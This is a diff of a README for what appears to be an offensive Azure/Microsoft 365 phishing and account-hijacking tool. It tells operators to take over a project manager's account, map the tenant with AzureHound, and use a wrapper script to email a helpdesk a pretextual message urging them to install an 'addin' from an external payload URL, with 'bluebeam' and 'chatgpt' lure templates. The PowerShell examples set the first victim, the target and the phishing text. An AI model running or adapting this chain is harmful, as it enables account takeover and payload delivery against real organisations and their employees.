@@ -14,7 +14,7 @@ Script will check your OS (Windows or Linux) and install the required modules an
 
 Use a -very- important project manager as your initial access vector, use their organization account to run azurehound to map the tenant and send a link internally to a payload hosted elsewhere. Runs azurehound module. You won't need it every time, but is a good way to start.
 
-The variable firstuser is the one you want to hijack, targetUser is the eventual target you hope to reach. Template will be sent first in the background, if the user approves, the message passed here will be emailed to them as the first victim.
+The variable firstuser is the one you want to hijack, targetUser is the eventual target you hope to reach. 'Bluebeam' Template will be sent first in the background, if the user approves, the message passed here will be emailed to them as the first victim.
 
 ```powershell
 $targetUser = "helpdesk@corpomax.com"
@@ -26,14 +26,14 @@ $template = "bluebeam" # or chatgpt, or one of the secret ones
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -azurehound
 ```
 
-Same scenario, but quicker with no installation or Azurehound. 
+Similar scenario, but trying a different user and the 'chatgpt' template, a little quicker with no installation or Azurehound switch 
 
 ```powershell
 $targetUser = "helpdesk@corpomax.com"
-$firstUser = "ClickamusMaximus@corpomax.com"
+$firstUser = "newemployee@corpomax.com"
 $messageContent = "Hey guys, <p> the client is asking us to install an addin, something to do with the 'period net' framework and PDFs, sounds gross, haha. Can you take a look and see if we can get it installed? Thy're really breathing down our necks https://pdfutil.azurewebsites.net/addin </p> <p> Thanks guys you're the unsung heroes of CorpoMax, they should pay you more! </p> <p> Sincerely Yours.</p>"
 $subject = "Software for Project Management"
-$template = "bluebeam"
+$template = "chatgpt"
 
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template
 ```
